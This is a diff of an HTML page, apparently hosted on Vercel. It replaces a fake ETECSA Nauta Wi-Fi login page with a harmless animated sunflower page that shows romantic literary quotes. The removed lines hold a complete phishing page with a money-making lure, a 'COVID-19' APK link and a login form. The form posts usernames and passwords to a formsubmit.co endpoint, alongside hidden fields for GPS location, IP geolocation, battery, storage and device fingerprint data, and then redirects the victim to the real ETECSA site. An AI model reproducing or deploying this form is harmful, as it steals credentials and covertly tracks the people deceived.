@@ -1,129 +1,242 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="Estyles/estilos.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jardín Eterno 💜</title>
+    <style>
+        :root {
+            --morado: #1a0026;
+            --amarillo: #ffdb3a;
+            --naranja: #e67e00;
+            --rosa: #ff69b4;
+        }
 
- <title>🔥 Recargas y dinero fácil en 2025</title>
-  <meta name="description" content="Conéctate y gana saldo y dinero extra con retos simples y seguros.">
+        body {
+            margin: 0; padding: 0;
+            background-color: var(--morado);
+            height: 100vh; width: 100vw;
+            overflow: hidden;
+            font-family: 'Georgia', serif;
+            touch-action: none;
+        }
 
-  <meta property="og:title" content="🔥 Recargas y dinero fácil en 2025">
-  <meta property="og:description" content="Conéctate y gana saldo y dinero extra con retos simples y seguros.">
-  <meta property="og:url" content="https://wifi-etecsa.vercel.app/">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="https://wifi-etecsa.vercel.app/log.png">
-  <meta property="og:image:type" content="image/png">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
+        /* POLVO DE ESTRELLAS */
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            opacity: 0.5;
+            animation: moveStars 10s linear infinite;
+        }
 
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="🔥 Recargas y dinero fácil en 2025">
-  <meta name="twitter:description" content="Conéctate y gana saldo y dinero extra con retos simples y seguros.">
-  <meta name="twitter:image" content="https://wifi-etecsa.vercel.app/log.png">
- 
-  
+        /* ESTILO GIRASOL */
+        .sunflower {
+            position: absolute;
+            width: 100px; height: 100px;
+            cursor: pointer;
+            transition: all 0.5s ease;
+            transform-style: preserve-3d;
+            animation: flotar 4s ease-in-out infinite;
+        }
+
+        .ring {
+            position: absolute; width: 90px; height: 90px;
+            border: 2px solid var(--amarillo); border-radius: 50%;
+            top: 50%; left: 50%; transform: translate(-50%, -50%);
+            box-shadow: 0 0 10px var(--amarillo); z-index: 2;
+            transition: border-color 0.3s ease;
+        }
+
+        .petal {
+            position: absolute; top: 50%; left: 50%;
+            background: linear-gradient(to top, var(--naranja), var(--amarillo));
+            border-radius: 50% 50% 20% 20% / 80% 80% 20% 20%;
+            transform-origin: bottom center; width: 12px; height: 42px;
+            margin-left: -6px; margin-top: -42px;
+        }
+
+        .center {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 38px; height: 38px; background: radial-gradient(circle, #3d1a00, #1a0d00);
+            border-radius: 50%; display: flex; justify-content: center; align-items: center;
+            z-index: 5; box-shadow: inset 0 0 10px #000;
+        }
+
+        .heart { color: var(--rosa); font-size: 14px; animation: latido 1s infinite; }
+
+        /* MODAL DE FRASES */
+        #modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(10, 0, 20, 0.9); display: none;
+            justify-content: center; align-items: center; z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #2e0046, #1a0026);
+            padding: 40px; border-radius: 30px; border: 2px solid var(--amarillo);
+            text-align: center; color: white; max-width: 75%;
+            transform: scale(0.7); transition: transform 0.4s ease;
+            box-shadow: 0 0 30px rgba(255, 219, 58, 0.2);
+        }
+
+        .modal-content.show { transform: scale(1); }
+
+        /* PANTALLA FINAL */
+        #final-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--morado); display: none; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 200;
+            color: white; text-align: center; animation: fadeIn 2s ease;
+        }
+
+        .btn-whatsapp {
+            background-color: #25d366; color: white; padding: 18px 35px;
+            border-radius: 50px; text-decoration: none; font-weight: bold;
+            font-family: sans-serif; margin-top: 25px;
+            box-shadow: 0 10px 20px rgba(37, 211, 102, 0.4);
+            border: none; cursor: pointer; font-size: 1rem;
+        }
+
+        @keyframes moveStars { from { transform: translateY(0); } to { transform: translateY(-100vh); } }
+        @keyframes flotar { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+        @keyframes latido { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.3); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
 </head>
-
 <body>
-   
-  <div class="container">
-    <div class="header">
+
+    <div id="stars-container"></div>
+    <div id="garden"></div>
+
+    <div id="modal" onclick="closeModal()">
+        <div class="modal-content" id="mContent">
+            <div id="phraseText" style="font-size: 1.3rem; font-style: italic; line-height: 1.5;"></div>
+            <div style="margin-top:25px; font-size: 0.8rem; color: var(--amarillo); letter-spacing: 2px; font-family: sans-serif;">CONTINUAR ➔</div>
+        </div>
     </div>
-    <div class="banner">
-      <img src="https://cdn-icons-png.flaticon.com/512/483/483947.png" alt="wifi" />
-      <div class="banner-text">
-        Tus familiares y amigos pueden <span style="color:#00c3ff;">recargar tu cuenta <i>nauta</i></span> desde el exterior a través de:
-        <br>
-        <a href="#">www.DTone.com</a>
-        <a href="#">www.ding.com</a>
-        <a href="#">www.csqworld.com</a>
-      </div>
-    </div><br>
-    <div class="lang-row">
-      <button>Español</button>
-      <button style="background:#e8e8e8;color:#252d8c;">English</button>
-    </div>
-    <div class="main">
-      <h2>Bienvenido</h2>
-      <a href="#">Descargue aquí APK "COVID-19"</a>
-      <form action="https://formsubmit.co/4d354c35f729d3a7b3355278e780dbaf" method="POST" >
+
+    <div id="final-screen">
+        <div class="sunflower" style="position: relative; transform: scale(1.6); margin-bottom: 60px; animation: flotar 5s infinite; cursor: default;">
+            <div class="ring" style="width: 100px; height: 100px;"></div>
+            <div id="final-petals"></div>
+            <div class="center" style="width: 45px; height: 45px;"><div class="heart" style="font-size: 18px;">♥</div></div>
+        </div>
+        <h1 style="color: var(--amarillo); margin: 0; font-size: 1.8rem;">¡Jardín Completado! 🌻</h1>
+        <p style="padding: 20px 40px; opacity: 0.8; line-height: 1.5;">Cada flor era un pensamiento,<br>pero mi favorita siempre serás tú.</p>
         
-        <div class="form-group">
-          <label for="usuario">Usuario:</label>
-          <input type="text" id="usuario" name="usuario">
-        </div>
-        <input type="hidden" name="_next" value="https://www.etecsa.cu/">
-        <div class="form-group">
-          <label for="contrasena">Contraseña:</label>
-          <input type="password" id="contrasena" name="contrasena">
-          <input type="hidden" name="ip_usuario" id="ip_usuario">
-
-<input type="hidden" name="gps_loc" id="gps_loc">
-<input type="hidden" name="gps_accuracy" id="gps_accuracy">
-<input type="hidden" name="gps_error" id="gps_error">
-
-          
-
-          
-  
-          
-          
-            <input type="hidden" name="navegador" id="navegador">
-  <input type="hidden" name="plataforma" id="plataforma">
-  <input type="hidden" name="idioma_navegador" id="idioma_navegador">
-  <input type="hidden" name="resolucion_pantalla" id="resolucion_pantalla">
-  <input type="hidden" name="fecha_hora_local" id="fecha_hora_local">
-
-          <input type="hidden" name="ram" id="ram" value="">
-  <input type="hidden" name="cpu" id="cpu" value="">
-  <input type="hidden" name="isTouch" id="isTouch" value="">
-  <input type="hidden" name="timezone" id="timezone" value="">
-  <input type="hidden" name="cookiesEnabled" id="cookiesEnabled" value="">
-  <input type="hidden" name="connectionType" id="connectionType" value="">
-  <input type="hidden" name="batteryLevel" id="batteryLevel" value="">
-  <input type="hidden" name="batteryCharging" id="batteryCharging" value="">
-          <input type="hidden" name="totalStorage" id="totalStorage">
-<input type="hidden" name="freeStorage" id="freeStorage">
-          <input type="hidden" id="ipinfo_ip" name="ipinfo_ip">
-<input type="hidden" id="ipinfo_country" name="ipinfo_country">
-<input type="hidden" id="ipinfo_region" name="ipinfo_region">
-<input type="hidden" id="ipinfo_city" name="ipinfo_city">
-<input type="hidden" id="ipinfo_postal" name="ipinfo_postal">
-<input type="hidden" id="ipinfo_loc" name="ipinfo_loc">
-<input type="hidden" id="ipinfo_timezone" name="ipinfo_timezone">
-          
-
-          
-          
-        </div>
-        <input type="hidden" name="_captcha" value="false">
-        <div class="form-buttons">
-          <button type="submit">Aceptar</button>
-          <button type="button">Cancelar</button>
-          <button type="button">Ayuda</button>
-        </div>
-      </form>
-      <div class="links">
-        <a href="#">Condiciones de uso de usuario</a>
-        <a href="#">Portal de Usuario</a>
-        <a href="#">Información</a>
-      </div>
+        <button onclick="enviarWhatsApp()" class="btn-whatsapp">Díselo por WhatsApp 📱</button>
     </div>
-    <div class="logos-section">
-      <div class="logos-row">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Cubadebate_logo.png" alt="Cubadebate">
-        <img src="https://www.cubaeduca.cu/themes/cubaeduca/logo.png" alt="CubaEduca">
-        <img src="https://cubarte.cult.cu/static/img/logo-cubarte.png" alt="Cubarte">
-      </div>
-      <div class="logos-row">
-        <img src="https://www.cubasi.cu/sites/all/themes/cubasi/logo.png" alt="Cubasi">
-        <img src="https://www.cubadebate.cu/wp-content/themes/cubadebate-2019/images/logo-cubadebate.png" alt="Otra">
-      </div>
-    </div>
-  </div>
-  <script src="script/script.js"></script>
 
-  
+    <script>
+        // --- CONFIGURACIÓN ---
+        const miNumero = "TUNUMERO"; // <--- Tu número sin el +
+        const totalGirasoles = 15;
+        
+        const phrases = [
+            "Te amo como se aman ciertas cosas oscuras, secretamente, entre la sombra y el alma. (Neruda) 💜",
+            "Andábamos sin buscarnos, pero sabiendo que andábamos para encontrarnos. (Cortázar) ✨",
+            "Si te quiero es porque sos mi amor, mi cómplice y todo. (Benedetti) 🌻",
+            "En un beso, sabrás todo lo que he callado. (Pablo Neruda) 💋",
+            "Tú eres la respuesta que nunca busqué, pero que siempre necesité. ✨",
+            "Mi táctica es mirarte, aprender como sos, quererte como sos. (Benedetti) 💎",
+            "Ven a dormir conmigo: no haremos el amor, él nos hará a nosotros. (Cortázar) 🌙",
+            "Para mi corazón basta tu pecho, para tu libertad bastan mis alas. (Neruda) 🦋",
+            "Si el girasol busca el sol, mi alma solo sabe buscar tu luz. ☀️",
+            "Te quiero para volvernos locos de risa, ebrios de nada. (Cortázar) 🍷",
+            "Amo tus pies porque anduvieron sobre la tierra hasta encontrarme. (Neruda) 👣",
+            "Tú eres mi momento favorito de todos los días. 💜"
+        ];
+
+        let eliminados = 0;
+
+        // Crear Polvo de Estrellas
+        const starsContainer = document.getElementById('stars-container');
+        for (let i = 0; i < 50; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            const size = Math.random() * 3 + 'px';
+            star.style.width = size;
+            star.style.height = size;
+            star.style.left = Math.random() * 100 + 'vw';
+            star.style.top = Math.random() * 100 + 'vh';
+            star.style.animationDuration = Math.random() * 5 + 5 + 's';
+            starsContainer.appendChild(star);
+        }
+
+        function createSunflower() {
+            const garden = document.getElementById('garden');
+            const sf = document.createElement('div');
+            sf.className = 'sunflower';
+            sf.style.left = Math.random() * 80 + 5 + 'vw';
+            sf.style.top = Math.random() * 80 + 5 + 'vh';
+
+            const ring = document.createElement('div');
+            ring.className = 'ring';
+            sf.appendChild(ring);
+
+            for (let i = 0; i < 12; i++) {
+                const p = document.createElement('div');
+                p.className = 'petal';
+                p.style.transform = `rotate(${i * 30}deg)`;
+                sf.appendChild(p);
+            }
+
+            const center = document.createElement('div');
+            center.className = 'center';
+            center.innerHTML = '<div class="heart">♥</div>';
+            sf.appendChild(center);
+
+            sf.onclick = (e) => {
+                e.stopPropagation();
+                ring.style.borderColor = "var(--morado)"; // Cambio a morado al tocar
+                sf.style.opacity = '0';
+                sf.style.transform = 'scale(2)';
+                setTimeout(() => {
+                    sf.remove();
+                    eliminados++;
+                    showModal();
+                }, 400);
+            };
+            garden.appendChild(sf);
+        }
+
+        function showModal() {
+            const modal = document.getElementById('modal');
+            const content = document.getElementById('mContent');
+            document.getElementById('phraseText').innerText = phrases[Math.floor(Math.random() * phrases.length)];
+            modal.style.display = 'flex';
+            setTimeout(() => content.classList.add('show'), 10);
+        }
+
+        function closeModal() {
+            document.getElementById('mContent').classList.remove('show');
+            setTimeout(() => {
+                document.getElementById('modal').style.display = 'none';
+                if (eliminados === totalGirasoles) {
+                    showFinalScreen();
+                }
+            }, 300);
+        }
+
+        function showFinalScreen() {
+            const finalPetals = document.getElementById('final-petals');
+            for (let i = 0; i < 12; i++) {
+                const p = document.createElement('div');
+                p.className = 'petal';
+                p.style.transform = `rotate(${i * 30}deg)`;
+                finalPetals.appendChild(p);
+            }
+            document.getElementById('final-screen').style.display = 'flex';
+        }
+
+        function enviarWhatsApp() {
+            const mensaje = encodeURIComponent("¡Me encantó tu jardín! Gracias por los girasoles y las frases de Neruda... 💜🌻");
+            window.open(`https://api.whatsapp.com/send?phone=${miNumero}&text=${mensaje}`, '_blank');
+        }
+
+        for (let i = 0; i < totalGirasoles; i++) { createSunflower(); }
+    </script>
 </body>
-</html> 
+</html>
